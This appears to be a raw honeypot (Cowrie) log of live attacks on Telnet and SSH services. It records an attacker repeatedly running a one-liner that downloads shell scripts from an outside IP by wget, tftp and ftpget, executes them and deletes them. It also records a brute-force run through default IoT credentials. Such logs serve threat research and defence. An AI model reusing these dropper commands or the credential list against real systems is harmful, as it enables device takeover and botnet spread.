+2017-06-15T14:08:12+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:12+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:12+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:12+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:12+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:12+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:12+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:12+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:12+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:12+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:12+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:12+0000 [SSHChannel None (1485) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] remote eof
+2017-06-15T14:08:12+0000 [SSHChannel None (1485) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] remote close
+2017-06-15T14:08:12+0000 [SSHChannel None (1485) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] sending close 1485
+2017-06-15T14:08:12+0000 [SSHChannel None (1486) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] remote eof
+2017-06-15T14:08:12+0000 [SSHChannel None (1486) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] remote close
+2017-06-15T14:08:12+0000 [SSHChannel None (1486) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] sending close 1486
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:12+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:13+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:13+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:13+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:13+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:13+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:13+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:16+0000 [CowrieTelnetTransport,57581,51.15.49.199] login attempt: 129
+2017-06-15T14:08:16+0000 [CowrieTelnetTransport,57581,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:18+0000 [CowrieTelnetTransport,57581,51.15.49.199] login attempt [Admin/Admin] failed
+2017-06-15T14:08:18+0000 [CowrieTelnetTransport,57581,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:19+0000 [CowrieTelnetTransport,57606,51.15.49.199] login attempt: 130
+2017-06-15T14:08:19+0000 [CowrieTelnetTransport,57606,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:21+0000 [CowrieTelnetTransport,57606,51.15.49.199] login attempt [root/xmhdipc] failed
+2017-06-15T14:08:21+0000 [CowrieTelnetTransport,57606,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:21+0000 [CowrieTelnetTransport,57608,51.15.49.199] login attempt: 131
+2017-06-15T14:08:21+0000 [CowrieTelnetTransport,57608,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:24+0000 [CowrieTelnetTransport,57608,51.15.49.199] login attempt [root/zlxx.] failed
+2017-06-15T14:08:24+0000 [CowrieTelnetTransport,57608,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:24+0000 [CowrieTelnetTransport,57577,51.15.49.199] login attempt: 132
+2017-06-15T14:08:24+0000 [CowrieTelnetTransport,57577,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:27+0000 [CowrieTelnetTransport,57577,51.15.49.199] login attempt [admin/] succeeded
+2017-06-15T14:08:28+0000 [CowrieTelnetTransport,57577,51.15.49.199] Opening TTY Log: log/tty/20170615-140828-None-57577i.log
+2017-06-15T14:08:28+0000 [CowrieTelnetTransport,57577,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:28+0000 [CowrieTelnetTransport,57585,51.15.49.199] login attempt: 133
+2017-06-15T14:08:28+0000 [CowrieTelnetTransport,57585,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:31+0000 [CowrieTelnetTransport,57585,51.15.49.199] login attempt [root/] failed
+2017-06-15T14:08:31+0000 [CowrieTelnetTransport,57585,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:31+0000 [CowrieTelnetTransport,57579,51.15.49.199] login attempt: 134
+2017-06-15T14:08:31+0000 [CowrieTelnetTransport,57579,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:34+0000 [CowrieTelnetTransport,57579,51.15.49.199] login attempt [admin/7ujMko0admin] failed
+2017-06-15T14:08:34+0000 [CowrieTelnetTransport,57579,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:35+0000 [CowrieTelnetTransport,57583,51.15.49.199] login attempt: 135
+2017-06-15T14:08:35+0000 [CowrieTelnetTransport,57583,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:37+0000 [CowrieTelnetTransport,57583,51.15.49.199] login attempt [Administrator/] failed
+2017-06-15T14:08:37+0000 [CowrieTelnetTransport,57583,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:39+0000 [CowrieTelnetTransport,57591,51.15.49.199] login attempt: 136
+2017-06-15T14:08:39+0000 [CowrieTelnetTransport,57591,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:42+0000 [CowrieTelnetTransport,57591,51.15.49.199] login attempt [root/5up] failed
+2017-06-15T14:08:42+0000 [CowrieTelnetTransport,57591,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:42+0000 [CowrieTelnetTransport,57580,51.15.49.199] login attempt: 137
+2017-06-15T14:08:42+0000 [CowrieTelnetTransport,57580,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:45+0000 [CowrieTelnetTransport,57580,51.15.49.199] login attempt [admin/admin] failed
+2017-06-15T14:08:45+0000 [CowrieTelnetTransport,57580,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:45+0000 [CowrieTelnetTransport,57582,51.15.49.199] login attempt: 138
+2017-06-15T14:08:45+0000 [CowrieTelnetTransport,57582,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:48+0000 [CowrieTelnetTransport,57582,51.15.49.199] login attempt [admin/meinsm] failed
+2017-06-15T14:08:48+0000 [CowrieTelnetTransport,57582,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:48+0000 [CowrieTelnetTransport,57584,51.15.49.199] login attempt: 139
+2017-06-15T14:08:48+0000 [CowrieTelnetTransport,57584,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:51+0000 [CowrieTelnetTransport,57584,51.15.49.199] login attempt [guest/12345] failed
+2017-06-15T14:08:51+0000 [CowrieTelnetTransport,57584,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:51+0000 [CowrieTelnetTransport,57586,51.15.49.199] login attempt: 140
+2017-06-15T14:08:51+0000 [CowrieTelnetTransport,57586,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:54+0000 [CowrieTelnetTransport,57586,51.15.49.199] login attempt [default/] failed
+2017-06-15T14:08:54+0000 [CowrieTelnetTransport,57586,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:54+0000 [CowrieTelnetTransport,57593,51.15.49.199] login attempt: 141
+2017-06-15T14:08:54+0000 [CowrieTelnetTransport,57593,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:08:57+0000 [CowrieTelnetTransport,57593,51.15.49.199] login attempt [root/admin] failed
+2017-06-15T14:08:57+0000 [CowrieTelnetTransport,57593,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:08:57+0000 [CowrieTelnetTransport,57578,51.15.49.199] login attempt: 142
+2017-06-15T14:08:57+0000 [CowrieTelnetTransport,57578,51.15.49.199] login return, expect: [admin/]
+2017-06-15T14:09:00+0000 [CowrieTelnetTransport,57578,51.15.49.199] login attempt [admin/5up] failed
+2017-06-15T14:09:00+0000 [CowrieTelnetTransport,57578,51.15.49.199] Warning: state changed and new state returned
+2017-06-15T14:09:00+0000 [CowrieTelnetTransport,57590,51.15.49.199] login attempt: 143
+2017-06-15T14:09:00+0000 [CowrieTelnetTransport,57590,51.15.49.199] login return, expect: [admin/]
